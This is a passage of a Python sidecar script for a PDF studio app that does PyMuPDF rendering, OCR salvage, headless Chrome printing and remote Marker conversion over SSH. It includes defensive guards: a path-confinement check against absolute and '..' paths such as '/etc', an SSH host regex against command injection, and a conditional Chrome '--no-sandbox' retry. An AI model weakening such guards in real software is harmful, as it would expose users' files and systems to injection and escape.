#!/usr/bin/env python3
"""PyMuPDF execution sidecar for Lynx PDF Studio's Python adapter.

Two modes:
  * `pdf_exec.py --probe`  → prints "ok" / exits 0 iff PyMuPDF imports.
  * default: reads a JSON request from stdin and applies one operation.

Request (stdin JSON):
  { "op": str, "params": {...}, "in": <pdf path>, "out": <pdf path>,
    "artifact_dir": <dir> }
The process runs with cwd = the workflow directory, so relative asset paths
(e.g. a replacement image) resolve directly.

Response (stdout JSON):
  { "ok": bool, "changed": bool, "note": str,
    "artifacts": [ { "tmp": <name in artifact_dir>, "path": <workflow-relative
    output path>, "kind": "text"|"image"|"pdf"|"json" } ], "error": str? }
Ops that only produce side artifacts (extract_*) set changed=false and leave the
working document untouched; replace_image/redact write `out` and set changed=true.
"""

import sys
import os
import re
import json


def _safe_rel(p):
    """Confine a workflow-supplied path to the current directory (the workflow
    dir). Returns a normalized relative path, or None if it is absolute or uses
    `..` to escape — so a crafted asset path can't read files outside the
    project. The sidecar runs with cwd = the workflow directory."""
    if not p or not isinstance(p, str):
        return None
    # Reject POSIX-absolute, Windows drive-prefixed (C:\x AND drive-relative C:x —
    # the latter resolves against drive C:'s own cwd, not ours), UNC (\\host), and any
    # leading slash/backslash (/etc, \x → the current drive's ROOT, escaping baseDir).
    # Mirrors the TS confinePath / validator guards for cross-guard parity.
    if os.path.isabs(p) or re.match(r"^([A-Za-z]:|[\\/])", p):
        return None
    norm = os.path.normpath(p)
    if norm == ".." or norm.startswith(".." + os.sep) or (os.altsep and norm.startswith(".." + os.altsep)):
        return None
    return norm


# Ops that CREATE a PDF from a non-PDF source (HTML/Markdown/EML/URL). They must
# not fitz.open() the input, and may run with no PDF input at all (url_to_pdf).
def _clamp_dpi(v, default=150):
    """Clamp a workflow-supplied DPI to a sane range — a huge value (e.g. 20000) would
    make get_pixmap allocate multi-GB bitmaps and exhaust memory."""
    try:
        return max(36, min(600, int(v)))
    except (TypeError, ValueError):
        return default


# --- oversized-page-safe rasterization (P0-1) --------------------------------------
# `_clamp_dpi` bounds the DPI but NOT the resulting pixel AREA, so a pathological page
# (e.g. 595 x 80,958 pt -> 2480 x 337,325 px at 300 dpi) throws
#     pymupdf.mupdf.FzErrorLimit: code=5: Overly large image
# and aborts the whole run. Route every get_pixmap-on-an-arbitrary-page call through
# `_safe_pixmap`, which reduces the effective DPI until the pixmap fits.
#
# Two cap tiers. Pure-raster ops (rasterize/render_pages/recolor/scanner_effect) never
# feed Tesseract, so they use a GENEROUS cap — a legitimate A0 sheet @ 300 dpi (~139 Mpx)
# must NOT be silently downscaled by the safety net. OCR-bound rendering uses the tighter
# cap that also respects Tesseract's per-side limit.
RASTER_MAX_PIXELS = 300_000_000   # ~300 Mpx — safely under MuPDF's ~2**31-byte crash line
RASTER_MAX_DIM = 60_000           # per-side, under fitz's ~65,500 coordinate ceiling
OCR_MAX_PIXELS = 120_000_000      # ~120 Mpx — safe for MuPDF and Tesseract
OCR_MAX_DIM = 30_000              # per-side, below Tesseract's 32,767 hard limit


def _fit_dpi(page, dpi, max_pixels=RASTER_MAX_PIXELS, max_dim=RASTER_MAX_DIM):
    """Largest DPI <= requested that keeps a whole-page pixmap within the area AND
    per-side limits. Returns (effective_dpi, was_downscaled). Floors at 1 (never 0), and
    never floors ABOVE what the per-side cap allows — correctness beats legibility on a
    28-m-tall artifact page."""
    r = page.rect
    scale = dpi / 72.0
    w, h = r.width * scale, r.height * scale
    factors = [1.0]
    if w * h > max_pixels:
        factors.append((max_pixels / (w * h)) ** 0.5)
    if max(w, h) > max_dim:
        factors.append(max_dim / max(w, h))
    f = min(factors)
    return max(1, int(dpi * f)), (f < 1.0)


def _safe_pixmap(page, dpi, max_pixels=RASTER_MAX_PIXELS, max_dim=RASTER_MAX_DIM, **kw):
    """`get_pixmap` that never exceeds the limits. Returns (pixmap, effective_dpi,
    downscaled: bool). Extra kwargs (clip, colorspace, …) pass through to get_pixmap."""
    eff, down = _fit_dpi(page, dpi, max_pixels, max_dim)
    return page.get_pixmap(dpi=eff, **kw), eff, down


def _downscale_note(downscales, dpi):
    """Summarize per-page DPI reductions into ONE example-capped note fragment — never
    enumerate every page (a 7,609-page doc would blow the note). `downscales` is a list
    of (page_1based, eff_dpi)."""
    if not downscales:
        return ""
    ex = ", ".join("p%d@%ddpi" % (p, e) for p, e in downscales[:3])
    more = " …+%d more" % (len(downscales) - 3) if len(downscales) > 3 else ""
    return " · %d oversized page(s) rendered at reduced DPI (requested %d: %s%s)" % (
        len(downscales), dpi, ex, more)


# --- text-coverage classifier (P1-5) -----------------------------------------------
# ONE source of truth for "does this page/doc have a usable text layer, and where does it
# need OCR?" — consumed by text_report, pdf_info, the ocr op's oversized-page exclusion,
# and extract_markdown's `ocr:auto` gate, so those four can never disagree (inconsistent
# thresholds are exactly the P1-5/P2-10 anti-pattern).
_COV_SCRIPTS = {
    "latin":      re.compile(r"[A-Za-z]"),
    "devanagari": re.compile(r"[ऀ-ॿ]"),
    "arabic":     re.compile(r"[؀-ۿ]"),
    "cjk":        re.compile(r"[一-鿿]"),
    "cyrillic":   re.compile(r"[Ѐ-ӿ]"),
}
_COV_OVERSIZE_PT = 5_000       # a normal page is < ~1,200 pt tall; beyond this it's an artifact
_COV_IMG_SIDE_PX = 200         # min image side to count as real content (not a logo / colour strip)


def _page_image_list(page):
    """The page's image placements as (w_px, h_px) pairs — DECODE-FREE (intrinsic sizes
    live in the get_images(full=True) tuple at indices 2, 3), never extract_image."""
    try:
        return [(im[2], im[3]) for im in (page.get_images(full=True) or []) if len(im) > 3]
    except Exception:  # noqa: BLE001
        return []


def _page_has_substantial_image(page, min_px=_COV_IMG_SIDE_PX, images=None):
    """True if the page carries an image big enough to plausibly hold text (→ an OCR
    candidate rather than a blank/logo page). Pass `images` (from _page_image_list) to
    reuse a list the caller already collected instead of walking the page twice."""
    for w, h in (_page_image_list(page) if images is None else images):
        if min(w, h) >= min_px:
            return True
    return False


def _text_coverage(doc, want_text=False, want_stats=False, min_image_px=None,
                   oversize_pt=None, sample=0):
    """Per-page + summary text/OCR classification. `want_text=True` also returns each
    page's extracted text so the pymupdf text/markdown engines can reuse it (no 2nd
    get_text pass); leave False (default) so a marker run doesn't hold thousands of page
    strings in RAM. `needs_ocr` is computed ONCE here and is deliberately conservative
    (a single scanned page must NOT flip a 7,609-page text doc into whole-doc OCR).

    `want_stats=True` adds PAGE STATS to each record — size in points, image-placement
    count and a `class` (text | image_only | empty) — plus doc-level averages. It costs
    one get_images() call per page (decode-free), so it stays OPT-IN: the hot callers
    (extract_markdown's ocr gate, the ocr op) never pay for it.
    `min_image_px` / `oversize_pt` override the classification thresholds; `sample=N`
    walks every Nth page only (a fast estimate on a huge doc — every count/list then
    describes the SAMPLED pages, reported as `pages_analyzed`)."""
    n = doc.page_count
    min_px = int(min_image_px) if min_image_px else _COV_IMG_SIDE_PX
    over_pt = float(oversize_pt) if oversize_pt else _COV_OVERSIZE_PT
    step = max(1, int(sample or 1))
    pages, empty, image_only, oversized = [], [], [], []
    script_pages = {k: 0 for k in _COV_SCRIPTS}
    total_chars = 0
    total_images = 0
    for i in range(0, n, step):
        pg = doc.load_page(i)
        r = pg.rect
        t = (pg.get_text() or "").strip()
        total_chars += len(t)
        big = max(r.width, r.height) > over_pt
        rec = {"page": i + 1, "chars": len(t)}
        if want_text:
            rec["text"] = t
        imgs = None
        if want_stats:
            imgs = _page_image_list(pg)
            total_images += len(imgs)
            rec["w"] = round(r.width, 1)
            rec["h"] = round(r.height, 1)
            rec["images"] = len(imgs)
        if big:
            rec["oversized"] = True
            oversized.append(i + 1)
        if not t:
            if not big and _page_has_substantial_image(pg, min_px, imgs):
                rec["image_only"] = True      # no text but a real image → OCR candidate
                image_only.append(i + 1)
            else:
                rec["empty"] = True           # blank / logo / artifact → OCR won't help
                empty.append(i + 1)
        if want_stats:
            rec["class"] = "image_only" if rec.get("image_only") else ("empty" if rec.get("empty") else "text")
        for name, rx in _COV_SCRIPTS.items():
            if rx.search(t):
                script_pages[name] += 1
        pages.append(rec)
    analyzed = len(pages)
    pages_with_text = sum(1 for p in pages if p["chars"] > 0)
    text_ratio = (pages_with_text / analyzed) if analyzed else 0.0
    summary = {
        "page_count": n,
        "pages_analyzed": analyzed,
        "pages_with_text": pages_with_text,
        "total_text_chars": total_chars,
        "text_ratio": round(text_ratio, 4),
        "text_coverage_pct": round(100.0 * text_ratio, 1),
        "empty_pages": empty,
        "image_only_pages": image_only,
        "oversized_pages": oversized,
        "scripts": {k: v for k, v in script_pages.items() if v},
        "needs_ocr": (pages_with_text == 0) or (text_ratio < 0.10),
    }
    if want_stats:
        summary["image_only_pct"] = round(100.0 * len(image_only) / analyzed, 1) if analyzed else 0.0
        summary["avg_images_per_page"] = round(total_images / analyzed, 2) if analyzed else 0.0
    if step > 1:
        summary["sampled"] = {"every": step, "pages_analyzed": analyzed, "estimate": True}
    return {"pages": pages, "summary": summary}


def _compact_pages(nums, limit=20):
    """Render a 1-based page list compactly as ranges (e.g. [1,2,3,7] → "1-3, 7"), capped."""
    nums = sorted(set(nums))
    if not nums:
        return "(none)"
    out, start, prev = [], nums[0], nums[0]
    for x in nums[1:]:
        if x == prev + 1:
            prev = x
            continue
        out.append("%d-%d" % (start, prev) if start != prev else "%d" % start)
        start = prev = x
    out.append("%d-%d" % (start, prev) if start != prev else "%d" % start)
    s = ", ".join(out[:limit])
    return s + (" …" if len(out) > limit else "")


def _coverage_recommendation(cs):
    """Turn a coverage summary into (kind, action, workflow) — the two fields that make
    the report ACTIONABLE: which of the four document shapes this is, and the workflow
    to author for it. `workflow` is a runnable OPW fragment, not prose."""
    io_pages = cs["image_only_pages"]
    analyzed = cs.get("pages_analyzed") or cs["page_count"] or 1
    io_pct = 100.0 * len(io_pages) / analyzed
    rng = _compact_pages(io_pages, limit=64) if io_pages else ""
    ranged = rng and "…" not in rng      # too fragmented to inline → let skip-text find them

    if cs["pages_with_text"] == 0 and not io_pages:
        return ("blank",
                "no text and no images — nothing to extract (blank or vector-only pages)",
                "# nothing to extract; if you expect text, rasterize + OCR:\n"
                "- ocr: { mode: force-ocr }\n"
                "- extract_markdown: { to: output/doc.md }")
    if not io_pages:
        return ("text-complete",
                "already has a text layer — extract text directly, do NOT re-OCR",
                "- extract_markdown: { to: output/doc.md, ocr: off }   # text layer is complete")
    if cs["pages_with_text"] == 0 or io_pct >= 90:
        return ("image-only",
                "no usable text layer — OCR the whole document",
                "- extract_markdown: { to: output/doc.md, ocr: auto }  # OCRs: no text layer to keep")
    return ("mixed",
            "text layer on most pages — OCR only the image-only page(s): " + rng,
            "# text layer on most pages — OCR ONLY the %d image-only page(s), then extract\n"
            "- ocr: { mode: skip-text%s }\n"
            "- extract_markdown: { to: output/doc.md, ocr: off }" % (
                len(io_pages), (', page_range: "%s"' % rng) if ranged else ""))


def _text_report_markdown(rep, pages, page_cap=200):
    """Human-readable companion to text_report.json — the same numbers as a one-screen
    summary, the suggested workflow, and a per-page stats table (capped: a 4,494-page
    doc must not produce a 4,494-row markdown table)."""
    cs = rep
    analyzed = cs.get("pages_analyzed") or cs["page_count"] or 1
    pct = lambda k: "%d (%.0f%%)" % (k, 100.0 * k / analyzed)  # noqa: E731
    listed = lambda ps: "" if not ps else " — page%s %s" % ("" if len(ps) == 1 else "s", _compact_pages(ps))  # noqa: E731
    scripts = ", ".join("%s (%d)" % (k, v) for k, v in sorted(cs.get("scripts", {}).items())) or "—"
    rows = [
        ("pages", str(cs["page_count"]) + ("" if analyzed == cs["page_count"] else " (%d analyzed)" % analyzed)),
        ("pages with text", pct(cs["pages_with_text"])),
        ("image-only (OCR candidates)", pct(len(cs["image_only_pages"])) + listed(cs["image_only_pages"])),
        ("blank / no usable content", pct(len(cs["empty_pages"])) + listed(cs["empty_pages"])),
        ("oversized pages", pct(len(cs["oversized_pages"])) + listed(cs["oversized_pages"])),
        ("total characters", "{:,}".format(cs["total_text_chars"])),
        ("avg images per page", str(cs.get("avg_images_per_page", "—"))),
        ("scripts", scripts),
        ("needs whole-document OCR", "yes" if cs["needs_ocr"] else "no"),
        ("damaged streams", "yes — run `repair` first" if cs.get("damaged_streams") else "no"),
    ]
    out = [
        "# Text coverage — %d page(s)" % cs["page_count"],
        "",
        "**Recommendation: `%s`** — %s" % (cs.get("recommendation", "?"), cs.get("recommended_action", "")),
        "",
        "| metric | value |",
        "| --- | --- |",
    ]
    out += ["| %s | %s |" % (k, v) for k, v in rows]
    out += ["", "## Suggested workflow", "", "```yaml", "operations:"]
    out += ["  " + ln for ln in cs.get("recommended_workflow", "").split("\n")]
    out += ["```", ""]
    if pages:
        out += ["## Page stats", "", "| page | size (pt) | chars | images | class |", "| ---: | --- | ---: | ---: | --- |"]
        for p in pages[:page_cap]:
            size = "%s × %s" % (p.get("w", "?"), p.get("h", "?")) + (" ⚠ oversized" if p.get("oversized") else "")
            out.append("| %d | %s | %d | %s | %s |" % (
                p["page"], size, p["chars"], p.get("images", "?"), p.get("class", "—")))
        if len(pages) > page_cap:
            out.append("")
            out.append("_… %d more page(s) — see the JSON report for the full table._" % (len(pages) - page_cap))
        out.append("")
    return "\n".join(out)


def _inspect_text_markdown(report, span_cap=500):
    """Human-readable companion to text-spans.json — a per-page table of the spans, so a
    reviewer can eyeball text, position, font and style without parsing JSON. Capped so a
    dense document doesn't produce a thousand-row table (the JSON has the full set)."""
    out = [
        "# Text spans",
        "",
        "- Coordinate origin: **%s** · units: points" % report.get("coordinate_origin", "top-left"),
        "- **%d** span(s) across **%d** page(s)" % (report.get("total_spans", 0), report.get("total_pages", 0)),
    ]
    if report.get("terms"):
        out.append("- Terms: %s" % ", ".join("`%s`" % t for t in report["terms"]))
    out.append("")
    shown = 0
    for pg in report.get("pages", []):
        spans = pg.get("spans", [])
        if not spans:
            continue
        out += [
            "## Page %d  (%g × %g pt)" % (pg["page"], pg.get("width", 0), pg.get("height", 0)),
            "",
            "| text | bbox [x0,y0,x1,y1] | font | size | color | style |",
            "| --- | --- | --- | ---: | --- | --- |",
        ]
        for s in spans:
            if shown >= span_cap:
                break
            txt = str(s.get("text", "")).replace("|", "\\|").replace("\n", " ")
            if len(txt) > 60:
                txt = txt[:57] + "…"
            bbox = ", ".join("%g" % v for v in s.get("bbox", []))
            style = " ".join(w for w, on in (("bold", s.get("bold")), ("italic", s.get("italic"))) if on) or "—"
            out.append("| %s | %s | %s | %g | %s | %s |" % (
                txt, bbox, s.get("font", ""), s.get("size", 0), s.get("color", ""), style))
            shown += 1
        out.append("")
        if shown >= span_cap:
            out.append("_… span cap (%d) reached — see the JSON report for the full set._" % span_cap)
            break
    if report.get("total_spans", 0) == 0:
        out.append("_No spans matched. Check `terms`/`pages`, or run `ocr` first if this PDF is a scan (no text layer)._")
    return "\n".join(out)


# --- OCR hardening (P0-2 + P1-3 + P1-4) --------------------------------------------
# mode -> ocrmypdf keyword. skip-text keeps existing text (fast, fills gaps); redo-ocr
# strips prior OCR and re-recognizes (keeps original images); force-ocr rasterizes + OCRs
# everything.
_OCR_MODE_KW = {
    "skip-text": {"skip_text": True},
    "redo-ocr":  {"redo_ocr": True},
    "force-ocr": {"force_ocr": True},
}


def _installed_tesseract_langs():
    """Languages Tesseract can actually load (installed tessdata). Empty set if the list
    can't be read (then we skip enforcement). `--list-langs` prints to stdout on modern
    Tesseract but STDERR on some older builds — read both, keep only lang-code-shaped
    tokens (drops the "List of available languages (N):" header and any path lines)."""
    try:
        import subprocess
        r = subprocess.run(["tesseract", "--list-langs"], capture_output=True, text=True,
                           encoding="utf-8", errors="replace")
        langs = set()
        for ln in ((r.stdout or "") + "\n" + (r.stderr or "")).splitlines():
            ln = ln.strip()
            if re.match(r"^[A-Za-z0-9_]+$", ln):
                langs.add(ln)
        return langs
    except Exception:  # noqa: BLE001
        return set()


def _pikepdf_rewrite(path):
    """Normalize a structurally-damaged PDF in place with pikepdf (the `repair` one-liner).
    Returns the page count on success; raises on failure."""
    import pikepdf
    tmp = path + ".repair"
    with pikepdf.open(path) as pdf:
        npg = len(pdf.pages)
        pdf.save(tmp)
    os.replace(tmp, path)
    return npg


def _parse_page_range(pr, n):
    """Parse an ocrmypdf-style "1-3,7" range into a set of 1-based pages (clamped to n).
    Empty string → all pages."""
    if not pr:
        return set(range(1, n + 1))
    pages = set()
    for part in pr.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, _, b = part.partition("-")
            try:
                a = int(a) if a.strip() else 1
                b = int(b) if b.strip() else n
            except ValueError:
                continue
            for x in range(max(1, a), min(n, b) + 1):
                pages.add(x)
        else:
            try:
                x = int(part)
            except ValueError:
                continue
            if 1 <= x <= n:
                pages.add(x)
    return pages


def _serialize_page_range(pages):
    """Sorted 1-based page set → compact, UNCAPPED ocrmypdf range string ("1-3,7")."""
    nums = sorted(pages)
    if not nums:
        return ""
    out, start, prev = [], nums[0], nums[0]
    for x in nums[1:]:
        if x == prev + 1:
            prev = x
            continue
        out.append("%d-%d" % (start, prev) if start != prev else "%d" % start)
        start = prev = x
    out.append("%d-%d" % (start, prev) if start != prev else "%d" % start)
    return ",".join(out)


def _ocrmypdf_hardened(in_pdf, out_pdf, kwargs, note):
    """ocrmypdf.ocr with P0-2 exit-4 salvage. On a PDF with damaged content-stream lengths,
    ocrmypdf OCRs the pages fine but its strict output validator rejects the result (CLI
    exit 4 = invalid_output_pdf) — the OCR content is good; a pikepdf rewrite makes it valid.
    Tier 1: if a partial output survived, rewrite it. Tier 2: if ocrmypdf DELETED its partial,
    normalize the SOURCE and re-run once, routing THAT output through the same rewrite. Temp
    files live in the adapter's private tmp dir (cleaned by the caller). Returns a result dict;
    salvage cases carry salvaged=True."""
    import ocrmypdf

    def _salvage(produced, extra):
        if os.path.exists(produced) and os.path.getsize(produced) > 0:
            try:
                npg = _pikepdf_rewrite(produced)
            except Exception:  # noqa: BLE001
                return None
            os.replace(produced, out_pdf)
            return {"ok": True, "changed": True, "salvaged": True,
                    "note": note + extra + " — repaired with pikepdf (%d pages)" % npg}
        return None

    tmp = out_pdf + ".ocr.pdf"   # a .pdf suffix — ocrmypdf keys some behaviour off it
    try:
        ocrmypdf.ocr(in_pdf, tmp, **kwargs)
        os.replace(tmp, out_pdf)
        return {"ok": True, "changed": True, "note": note}
    except Exception as e:  # noqa: BLE001
        salv = _salvage(tmp, "; ocrmypdf flagged its output invalid (damaged source)")
        if salv:
            return salv
        # ocrmypdf deleted its partial → normalize the SOURCE and re-run once.
        try:
            import shutil
            rep_src = out_pdf + ".src.pdf"
            shutil.copyfile(in_pdf, rep_src)
            _pikepdf_rewrite(rep_src)
        except Exception as e3:  # noqa: BLE001
            return {"ok": False, "error":
                    "OCR failed: %s (is Tesseract installed and on PATH? source repair also failed: %s)" % (e, e3)}
        tmp2 = out_pdf + ".ocr2.pdf"
        try:
            ocrmypdf.ocr(rep_src, tmp2, **kwargs)
            os.replace(tmp2, out_pdf)
            return {"ok": True, "changed": True, "salvaged": True,
                    "note": note + "; source had structural damage — repaired, then OCR'd"}
        except Exception as e2:  # noqa: BLE001
            salv2 = _salvage(tmp2, "; source repaired, OCR output still flagged invalid")
            if salv2:
                return salv2
            return {"ok": False, "error": "OCR failed after source repair: %s / %s" % (e, e2)}


CREATOR_OPS = {"html_to_pdf", "markdown_to_pdf", "eml_to_pdf", "url_to_pdf", "epub_to_pdf", "images_to_pdf"}


def _looks_like_pdf(path):
    """True if the file starts with the %PDF magic — used to refuse feeding a
    PDF into a text-source converter (which would render its raw bytes)."""
    try:
        with open(path, "rb") as f:
            return f.read(5).startswith(b"%PDF")
    except Exception:  # noqa: BLE001
        return False


# A clean, print-friendly stylesheet applied to Markdown/e-mail conversions so
# the output looks like a document rather than raw unstyled HTML. Kept inline
# (no web fonts / remote assets) so it renders identically under every engine
# and needs no network. Chrome honors all of it; PyMuPDF Story honors the common
# subset (fonts, spacing, table borders, code background).
_DEFAULT_CSS = """
@page { size: Letter; margin: 0.75in; }
body { font-family: -apple-system, Segoe UI, Helvetica, Arial, sans-serif;
  font-size: 11pt; line-height: 1.5; color: #24292f; }
h1, h2, h3, h4 { font-weight: 600; line-height: 1.25; margin: 1.2em 0 0.5em; }
h1 { font-size: 1.9em; border-bottom: 1px solid #d0d7de; padding-bottom: .2em; }
h2 { font-size: 1.5em; border-bottom: 1px solid #d0d7de; padding-bottom: .2em; }
h3 { font-size: 1.25em; } h4 { font-size: 1.05em; }
p, ul, ol, blockquote, table { margin: 0 0 0.8em; }
a { color: #0969da; text-decoration: none; }
code { font-family: SFMono-Regular, Consolas, monospace; font-size: 0.88em;
  background: #eff1f3; padding: .15em .35em; border-radius: 4px; }
pre { background: #f6f8fa; padding: 12px 14px; border-radius: 6px;
  overflow: auto; line-height: 1.4; }
pre code { background: transparent; padding: 0; font-size: 0.85em; }
blockquote { color: #57606a; border-left: .25em solid #d0d7de;
  padding: 0 1em; margin-left: 0; }
table { border-collapse: collapse; width: 100%; }
th, td { border: 1px solid #d0d7de; padding: 6px 12px; text-align: left; }
th { background: #f6f8fa; font-weight: 600; }
img { max-width: 100%; }
hr { border: 0; border-top: 1px solid #d0d7de; margin: 1.5em 0; }
"""


def _html_document(body, title="", css=_DEFAULT_CSS):
    """Wrap rendered body HTML in a full, self-styled document."""
    safe_title = str(title or "").replace("<", "&lt;").replace(">", "&gt;")
    return (
        "<!doctype html><html><head><meta charset='utf-8'>"
        + ("<title>%s</title>" % safe_title if safe_title else "")
        + "<style>" + css + "</style></head><body>" + body + "</body></html>"
    )


def _find_browser():
    """Locate a Chromium-family browser for high-fidelity headless printing,
    without bundling one. Honors PDF_STUDIO_BROWSER, then the usual Edge/Chrome
    install locations (Edge ships with Windows), then PATH. Returns a path or
    None."""
    import shutil
    override = os.environ.get("PDF_STUDIO_BROWSER")
    if override and os.path.exists(override):
        return override
    candidates = []
    if os.name == "nt":
        for var in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
            base = os.environ.get(var)
            if not base:
                continue
            candidates += [
                os.path.join(base, "Microsoft", "Edge", "Application", "msedge.exe"),
                os.path.join(base, "Google", "Chrome", "Application", "chrome.exe"),
            ]
    else:
        candidates += [
            "/usr/bin/google-chrome", "/usr/bin/chromium",
            "/usr/bin/chromium-browser", "/usr/bin/microsoft-edge",
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
        ]
    for p in candidates:
        if p and os.path.exists(p):
            return p
    for name in ("chrome", "chromium", "chromium-browser", "google-chrome", "msedge", "microsoft-edge"):
        found = shutil.which(name)
        if found:
            return found
    return None


def _browser_run(cmd, timeout):
    """Run a headless-browser command, killing the WHOLE process tree if it
    times out — Chrome spawns renderer/GPU children that `subprocess.run`'s
    timeout would leave orphaned. Returns (returncode, stderr_bytes)."""
    import subprocess
    popen_kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.PIPE}
    if os.name != "nt":
        popen_kwargs["start_new_session"] = True  # own process group to killpg
    proc = subprocess.Popen(cmd, **popen_kwargs)
    try:
        _out, err = proc.communicate(timeout=timeout)
        return proc.returncode, err
    except subprocess.TimeoutExpired:
        try:
            if os.name == "nt":
                subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True)
            else:
                import signal as _signal
                os.killpg(os.getpgid(proc.pid), _signal.SIGKILL)
        except Exception:  # noqa: BLE001
            proc.kill()
        try:
            proc.communicate(timeout=10)
        except Exception:  # noqa: BLE001
            pass
        raise


def _render_via_chrome(html, out_pdf, base_url=None, url=None):
    """Render HTML (or a live `url`) → PDF with a system Chromium/Edge in headless
    print mode — full CSS/JS fidelity, no bundled browser. For HTML, writes a temp
    .html in the workflow dir (so relative image paths resolve) and prints it.
    Returns the browser basename; raises on failure."""
    import subprocess
    import tempfile
    import uuid
    browser = _find_browser()
    if not browser:
        raise RuntimeError("no Chrome/Edge/Chromium found for engine 'chrome'")
    # Write the temp HTML into base_url's dir (or cwd) so relative <img> resolve.
    html_dir = base_url if (base_url and os.path.isdir(base_url)) else os.getcwd()
    tmp_html = None if url else os.path.join(html_dir, ".lynx-render-%s.html" % uuid.uuid4().hex[:8])
    profile = tempfile.mkdtemp(prefix="lynx-chrome-")
    out_abs = os.path.abspath(out_pdf)
    try:
        if url:
            file_url = str(url)
        else:
            with open(tmp_html, "w", encoding="utf-8") as f:
                f.write(html)
            file_url = "file:///" + os.path.abspath(tmp_html).replace(os.sep, "/").lstrip("/")
        # Keep the browser's exploit-mitigation sandbox ON by default — this renders
        # attacker-influenceable HTML/URLs (html_to_pdf/markdown_to_pdf/url_to_pdf).
        # Only if a sandboxed run produces nothing do we retry with --no-sandbox
        # (some locked-down/CI environments can't start the sandbox). file_url stays
        # LAST so a validated http(s) URL can never be parsed as a flag.
        cmd = [
            browser, "--headless=new", "--disable-gpu",
            "--no-first-run", "--no-default-browser-check", "--disable-extensions",
            "--user-data-dir=" + profile,
            "--no-pdf-header-footer",
            "--print-to-pdf=" + out_abs,
            "--virtual-time-budget=8000",
            file_url,
        ]
        _code, stderr = _browser_run(cmd, timeout=90)
        if not (os.path.exists(out_abs) and os.path.getsize(out_abs) > 0):
            # Older Chrome builds reject --headless=new; retry with the legacy flag.
            # Only disable the sandbox if Chrome actually COMPLAINED about it (some
            # locked-down/root/CI environments can't start it) — never for a benign
            # render hiccup, so untrusted HTML keeps the sandbox on the retry too.
            cmd[1] = "--headless"
            serr = (stderr or b"").decode("utf-8", "replace").lower()
            if "sandbox" in serr and "--no-sandbox" not in cmd:
                cmd.insert(2, "--no-sandbox")
            _code, stderr = _browser_run(cmd, timeout=90)
        if not (os.path.exists(out_abs) and os.path.getsize(out_abs) > 0):
            err = (stderr or b"").decode("utf-8", "replace")[-300:]
            raise RuntimeError("headless print produced no output: %s" % err)
        return os.path.basename(browser)
    finally:
        if tmp_html:
            try:
                os.remove(tmp_html)
            except OSError:
                pass
        try:
            import shutil
            shutil.rmtree(profile, ignore_errors=True)
        except Exception:  # noqa: BLE001
            pass


def _clean_markdown(md):
    """Tidy HTML artifacts pymupdf4llm emits. On scanned/noisy PDFs it wraps many
    ordinary words in <sup>/<sub> (baseline jitter), producing thousands of bogus
    tags — and often mashing the boundary words together. Replace each tag (and
    <br>) with a space to drop the noise AND recover the lost word boundary, then
    collapse the resulting space runs per line — leaving table rows (leading `|`)
    untouched so column alignment survives."""
    if not md:
        return md
    md = re.sub(r"</?su[bp]>", " ", md)
    md = re.sub(r"<br\s*/?>", " ", md)
    out = []
    for line in md.split("\n"):
        if line.lstrip().startswith("|"):
            out.append(line)  # table row — preserve alignment
            continue
        stripped = line.lstrip()
        indent = line[: len(line) - len(stripped)]
        out.append(indent + re.sub(r"[ \t]{2,}", " ", stripped).rstrip())
    return "\n".join(out)


def _marker_remote(pdf_path, remote, force_ocr=False):
    """Offload Marker to a remote GPU box over SSH → Markdown string. Validates
    the host (prevents ssh option/command injection), sets Marker up there on
    first use (idempotent), uploads the PDF, runs it on the GPU with VRAM-safe
    batch sizes, and returns the Markdown. Needs key-based SSH + scp on PATH.
    force_ocr maps to marker's own --force_ocr (feature-detected — an older box
    without the flag is used without it rather than hard-failing)."""
    import subprocess
    import tempfile
    if not re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]*(@[A-Za-z0-9._-]+)?$", remote):
        raise ValueError("invalid remote host %r (expected \"user@host\")" % remote)
    opts = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=accept-new", "-o", "ConnectTimeout=15"]
    venv, wd = "marker-venv", "marker_work"

    def run(cmd):
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(((r.stderr or r.stdout or "").strip()[-400:]) or ("remote step failed: %s" % cmd[0]))
        return r

    setup = (
        "if [ ! -x %s/bin/marker_single ]; then python3 -m venv %s && "
        "%s/bin/pip install -q -U pip && %s/bin/pip install -q marker-pdf; fi; "
        "mkdir -p %s/in %s/out"
    ) % (venv, venv, venv, venv, wd, wd)
    run(["ssh", *opts, remote, setup])
    run(["scp", *opts, "-q", pdf_path, "%s:%s/in/doc.pdf" % (remote, wd)])
    env = (
        "PYTORCH_CUDA_ALLOC_CONF=expandable_segments:True TORCH_DEVICE=cuda "
        "RECOGNITION_BATCH_SIZE=16 DETECTOR_BATCH_SIZE=6 LAYOUT_BATCH_SIZE=6 "
        "TABLE_REC_BATCH_SIZE=4 OCR_ERROR_BATCH_SIZE=4"
    )
    flag = ""
    if force_ocr:
        # marker's flag surface moved across marker-pdf pre-1.0 vs 1.x — probe --help so an
        # older box doesn't hard-fail on an unknown flag; skip it silently if unsupported.
        try:
            h = subprocess.run(["ssh", *opts, remote, "%s/bin/marker_single --help" % venv],
                               capture_output=True, text=True)
            if "force_ocr" in ((h.stdout or "") + (h.stderr or "")):
                flag = " --force_ocr"
        except Exception:  # noqa: BLE001
            pass
    run(["ssh", *opts, remote, "%s %s/bin/marker_single %s/in/doc.pdf --output_dir %s/out --output_format markdown%s" % (env, venv, wd, wd, flag)])
    with tempfile.TemporaryDirectory() as td:
        local = os.path.join(td, "doc.md")
        run(["scp", *opts, "-q", "%s:%s/out/doc/doc.md" % (remote, wd), local])
        with open(local, "r", encoding="utf-8") as f:
            return f.read()


# --- remote Marker over HTTP (P1-7) + chunked resume (P2-11) ------------------------
_MARKER_SCHEMA = "1"   # bump if the chunking/concat scheme changes → invalidates old caches


def _marker_http_post(endpoint, pdf_path, force_ocr, timeout=1800):
    """POST one chunk PDF as multipart/form-data to the Marker service, return its
    `markdown` field. stdlib urllib (curl isn't guaranteed on Windows PATH)."""
    import urllib.request
    import uuid
    with open(pdf_path, "rb") as f:
        filedata = f.read()
